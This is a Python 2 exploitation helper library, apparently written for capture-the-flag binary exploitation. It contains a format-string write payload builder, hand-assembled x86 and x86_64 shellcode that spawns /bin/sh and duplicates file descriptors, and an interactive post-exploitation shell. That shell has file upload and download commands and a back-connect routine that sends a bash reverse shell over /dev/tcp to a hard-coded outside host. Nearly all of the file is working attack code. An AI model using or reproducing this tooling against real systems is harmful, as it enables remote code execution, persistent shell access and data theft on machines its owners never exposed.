#!/usr/bin/env python
import sys
import socket
import base64
import signal
import random
from struct import pack,unpack

rhp     = ("localhost",8080)
lhp     = ('www.shift-crops.net',4296)

PREV_INUSE          = 0b001
IS_MMAPED           = 0b010
IS_NON_MAINARENA    = 0b100

PROT_READ   = 0b001
PROT_WRITE  = 0b010
PROT_EXEC   = 0b100

fsb_len     = lambda x:    "%6$"+str(x if x>0 else 0x10000+x)+"x" if x!=0 else ""
heap_sb     = lambda x,y:  (x&~0b111)|y
pack_32     = lambda x:    pack('<I',x)
pack_64     = lambda x:    pack('<Q',x)
unpack_32   = lambda x:    unpack('<I',x)[0]
unpack_64   = lambda x:    unpack('<Q',x)[0]

info        = lambda x:    sys.stdout.write('[+]'+x+'\n')
proc        = lambda x:    sys.stdout.write('[*]'+x+'\n')
warn        = lambda x:    sys.stderr.write('[-]'+x+'\n')
    
#==========

class Communicate:    
    def __init__(self,rhp=("localhost", 8080),to=1.0):
        #proc('Connect to %s:%d' % rhp)
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if(to is not None):
            self.sock.settimeout(to)
        self.sock.connect(rhp)

    def send(self,msg):
        self.sock.sendall(msg)

    def sendln(self,msg):
        self.send(msg+'\n')

    def read(self,num=4):
        rsp = ''
        try:
            rsp += self.sock.recv(num)
        except:
            True
        finally:
            return rsp

    def read_all(self):
        rsp = ''
        try:
            while True:
                rsp += self.sock.recv(512)
        except:
            True
        finally:
            return rsp

    def read_until(self,term='\n'):
        rsp = ''
        try:
            while not rsp.endswith(term):
                rsp += self.sock.recv(1)
        except:
            True
        finally:
            return rsp

    def __del__(self):
        #proc('Disconnect...')
        self.sock.close()

#==========

class FSB:
    def __init__(self,offset=0,size=2,debug=False):
        self.__fsb  = ''
        self.adrval = {}
        self.wrote  = False
        self.debug  = debug
        
        if offset % 4:
            pad_size = 4 - offset%4
            warn('FSB : Offset size is not a multiple of 4')
            info('FSB : Auto padding size is 0x%d bytes' % pad_size)
            self.__fsb += '\x90'*pad_size
            offset += pad_size
        self.offset = self.count = offset
        
        if size == 1:
            self.wfs = 2        # %hhn
            self.fr  = 0x100
        elif size == 4:
            self.wfs = 0        # %n
            self.fr  = 0x1000000
        else:
            if size != 2:
                warn('FSB : Unit size %d bytes is invalid' % size)
                info('FSB : Set unit size 2 bytes')
                size = 2
            self.wfs = 1        # %hn
            self.fr  = 0x10000
        self.size   = size

    def get(self):
        return self.__fsb
    
    def addr(self,addr):
        if(self.wrote):
            warn('FSB : Values were already written')
        self.count += 4
        self.__fsb += pack_32(addr)
        return pack_32(addr)

    def write(self,index,value):
        self.wrote = True
        x = value - self.count
        fsb  = '%%%d$%dx' % (6, x if x>0 else self.fr+x) if x else ''
        fsb += '%%%d$%sn' % (index + self.offset/4, 'h'*self.wfs)
        self.count = value
        self.__fsb += fsb
        return fsb

    def set_adrval(self, addr, value):
        self.adrval.update({addr:value})

    def auto_write(self,index,adrval={}):
        fsb = ''
        d = {}
        l = []
        adrval.update(self.adrval)
        for a, v in adrval.items():
            if self.size == 1:
                div = {a:v&0xff, a+1:(v>>0x8)&0xff, a+2:(v>>0x10)&0xff, a+3:(v>>0x18)&0xff}
            elif self.size == 4:
                div = {a:v}
            else:
                div = {a:v&0xffff, a+2:v>>0x10}
            d.update(div)
        for a, v in sorted(d.items(), key=lambda x:x[1]):
            if self.debug:
                print '0x%08x <- 0x%04x' % (a,v)
            fsb += self.addr(a)
            l+=[v]
        for value in l:
            fsb += self.write(index,value)
            index += 1
        return fsb

#==========

class ShellCode:        
    def __init__(self,arch='x86', max_len=None):
        self.__shellcode  = ''
        if arch not in ['x86','x86_64','amd64','arm']:
            warn('ShellCode : Architecture "%s" is not defined' % arch)
            info('ShellCode : Set arch "x86"')
            arch = 'x86'
        self.arch       = arch
        self.max_len    = max_len

    def get(self):
        return self.__shellcode

    def add(self,code):
        self.__shellcode += code

    def check(self,code):
        if self.max_len is not None and self.max_len < len(self.__shellcode+code):
            warn('ShellCode : Length exceeds 0x%x bytes' % self.max_len)
            return ''
        self.__shellcode += code
        return code

    def padding(self,pad_size=None,word='\x90'):
        if pad_size is None:
            if self.max_len is not None:
                pad_size = self.max_len - len(self.__shellcode)
                info('ShellCode : Auto padding size is 0x%x bytes' % pad_size)
            else:
                warn('ShellCode : Padding size is not declared')
                return ''
        return self.check((word * (pad_size/len(word)+1))[:pad_size])

    def sh(self):
        asm = ''
        if self.arch is 'x86':
            asm +=  '\x31\xd2'                  # xor    edx, edx
            asm +=  '\x52'                      # push   edx
            asm +=  '\x68//sh'                  # push   0x68732f2f
            asm +=  '\x68/bin'                  # push   0x6e69622f
            asm +=  '\x89\xe3'                  # mov    ebx, esp
        elif self.arch in ['x86_64','amd64']:
            asm += '\x48\xbb//bin/sh'           # mov   rbx, '//bin/sh'
            asm += '\x48\xc1\xeb\x08'           # shr   rbx, 8
            asm += '\x53'                       # push  rbx
            asm += '\x48\x89\xe7'               # mov   rdi, rsp
        elif self.arch is 'arm':
            asm += ''
        return self.check(asm)+self.execve()

    def execve(self,addr=None):
        asm = ''
        if self.arch is 'x86':
            if(addr is not None):
                asm +=  '\xbb' + pack_32(addr)      # mov    ebx, addr
                asm +=  '\x31\xd2'                  # xor    edx, edx
            asm +=  '\x31\xc9'                  # xor    ecx, ecx
            asm +=  '\x31\xc0'                  # xor    eax, eax
            asm +=  '\xb0\x0b'                  # mov    al, 0x0b
            asm +=  '\xcd\x80'                  # int    0x80
        elif self.arch in ['x86_64','amd64']:
            if(addr is not None):
                asm += '\x48\xbf' + pack_64(addr)   # mov   rdi, addr
            asm += '\x48\x89\xe7'               # mov   rdi, rsp
            asm += '\x48\x31\xf6'               # xor   rsi, rsi
            asm += '\x48\x31\xd2'               # xor   rdx, rdx
            asm += '\x48\x31\xc0'               # xor   rax, rax
            asm += '\xb0\x3b'                   # mov   al, 0x3b
            asm += '\x0f\x05'                   # syscall
        elif self.arch is 'arm':
            asm += ''
        return self.check(asm)

    def dup2(self,old,new):
        asm = ''
        if self.arch is 'x86':
            asm += '\x31\xc0'                   # xor   eax, eax
            asm += '\x31\xdb'                   # xor   ebx, ebx
            asm += '\x31\xc9'                   # xor   ecx, ecx
            asm += '\xb0\x3f'                   # mov   al, 0x3f
            if old > 0:
                asm += '\x80\xc3'+chr(old)      # add   bl, old
            if new > 0:
                asm += '\x80\xc1'+chr(new)      # add   cl, new
            asm += '\xcd\x80'                   # int   0x80 
        elif self.arch in ['x86_64','amd64']:
            asm += '\x48\x31\xc0'               # xor   rax, rax
            asm += '\x48\x31\xff'               # xor   rdi, rdi
            asm += '\x48\x31\xf6'               # xor   rsi, rsi
            asm += '\xb0\x21'                   # mov   al, 0x21
            if old > 0:
                asm += '\x40\x80\xc7'+chr(old)  # add   dil, old
            if new > 0:
                asm += '\x40\x80\xc6'+chr(new)  # add   sil, new
            asm += '\x0f\x05'                   # syscall 
        elif self.arch is 'arm':
            asm += ''
        return self.check(asm)

#==========

class Shell:
    def __init__(self,nc):
        self.nc = nc
        self.token=''
        for i in range(5):
            self.token+=random.choice("1234567890abcdefghijklmnopqrstuvwxyz")
        signal.signal(signal.SIGINT,self.wait_handler)

    def wait_handler(self, signum, stack):
        print 'SIGNAL %d received\n' % signum
        self.wait = False

    def select(self):
        which_b64 = self.command('which base64')
        self.enable_b64 = which_b64 and 'no base64' not in which_b64
        if not self.enable_b64:
            warn('base64 is not implemented')

        mode = ''
        while mode not in ('a','n','b'):
            mode = raw_input('Advanced/Normal/BackShell mode(a/n/b)...')
            
        if mode == 'b':
            self.back_connect()

        while mode in ('a','n'):
            mode = self.advanced() if mode == 'a' else self.normal()

    def command(self,cmd = '', interact = False):
        nc = self.nc
        if len(cmd)>0:
            nc.sendln(cmd + " 2>&1" + (('; echo __END_%s__' % self.token) if interact else ''))

        if interact:
            rsp = ''
            self.wait = True
            while self.wait:
                rsp = nc.read_until().split(('__END_%s__' % self.token))
                sys.stdout.write(rsp[0])
                if len(rsp)>1:
                    break
        else:
            return nc.read_all()

    def download(self,fpath = '*'):
        dname = fpath[:fpath.rfind('/')+1]
        if len(dname)==0:
            dname = './'
        
        files = self.command('ls %s || echo "Error"' % (dname+fpath.split('/')[-1])).split('\n')
            
        if 'Error' not in files:                
            for fpath in files:
                if dname in fpath and ':' not in fpath:
                    fname = fpath.split('/')[-1]
                    proc('Downloading "%s" ...' % fpath)
                    
                    data = ''
                    if self.enable_b64:
                        enc_data = self.command('base64 %s 2>&1 || echo "Error"' % fpath)
                        if 'Error' in enc_data:
                            warn(enc_data.split('\n')[0])
                        else:
                            data = base64.b64decode(enc_data)
                    else:
                        data = self.command('cat %s' % fpath)                  
                        
                    if len(data)>0:
                        open(fname,'wb').write(data)
                        info('"%s" download succeeded!\n' % fname)
                    else:
                        warn('"%s" download failed...\n' % fname)
        else:
            warn('"%s" does not exist' % fpath)

    def upload(self,fname = None):
        data = open(fname,'rb').read()
        enc_data = base64.b64encode(data)

        fname = fname.split('/')[-1]
        rsp = self.command('echo %s | base64 -d > %s' % (enc_data,fname))

        if len(rsp)==0:
            info('"%s" upload succeeded!\n' % fname)
        else:
            warn('"%s" upload failed...\n' % fname)

    def back_connect(self,hp = None):
        if(hp is None):
            tmp = raw_input('Input host "Addr:Port"(Enter:deafult)>>')
            if ':' in tmp:
                tmp = tmp.split(':')
                hp = (tmp[0],int(tmp[1]))
            else:
                hp = lhp
            
        info('Back Connect to %s:%d\n' % hp)
        self.command('/bin/bash -c "bash -i >& /dev/tcp/%s/%d 0>&1 &"' % hp)
            
    def advanced(self):
        whoami = self.command('whoami').split('\n')[0]
        if 'whoami:' in whoami:
            whoami = '********'
        hostname = self.command('hostname').split('\n')[0]
        pwd = self.command('pwd').split('\n')[0]

        while True:
            cmd = raw_input('[%s@%s:%s]$ ' % (whoami,hostname,pwd))
            
            pgm = cmd.split(' ')
            if pgm[0]=='GET':
                if len(pgm)>1:
                    self.download(pgm[1])
                else:
                    warn('GET <file name>')
            elif pgm[0]=='PUT':
                if len(pgm)>1:
                    self.upload(pgm[1])
                else:
                    warn('PUT <file name>')
            elif pgm[0]=='BACK':
                self.back_connect((pgm[1],int(pgm[2])) if len(pgm)>2 else None)
            elif 'cd ' in cmd:
                self.command(cmd)
                pwd = self.command('pwd')[:-1]
            elif pgm[0] in ('exit','MODE')  :
                break
            else:
                self.command(cmd,True)

        return 'n' if pgm[0]!='exit' else ''

    def normal(self):
        while True:
            cmd = raw_input("$")
            if cmd.split(' ')[0] in ('exit','MODE'):
                break
            else:
                self.command(cmd,True)

        return 'a' if cmd.split(' ')[0]!='exit' else ''

    def __del__(self):
        self.nc.sendln('exit')

#==========
